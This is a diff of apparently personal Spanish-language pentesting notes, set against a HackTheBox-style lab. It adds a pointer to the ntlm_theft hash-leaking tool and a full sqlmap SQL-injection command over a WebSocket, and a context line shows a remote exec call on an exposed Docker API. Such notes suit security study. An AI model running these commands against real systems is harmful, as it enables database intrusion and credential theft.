@@ -4811,6 +4811,34 @@ curl -X POST http://192.168.65.7:2375/exec/<EXECID>/start \
 
 > https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
 
+Si pero existe una herramienta que genera todos los archivos que pueden regresar un hash ntlm.
+
+```
+
+```
+
+> https://github.com/Greenwolf/ntlm_theft
+
+## Web socket SQLI (SQLMAP)
+
+Para que sqlmap acepte  realizar un sqli sobre web socket tines que agregar la siguiente dependencia. Para no romper nuestro kali con todas las dependencias de Python usamos UV
+
+```
+# En lugar de
+
+pip install websocket-client
+
+# Use esto 
+
+uv venv
+source .venv/bin/activate
+uv pip install websocket-client
+
+# Ya dentro de ese venv ejecute el sqlmap
+
+sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3
+``` 
+
 ## Agregar .git a seclist
 
 Se me hace una tonteria que no tenga esta ruta las listas en seclist por lo que usa:
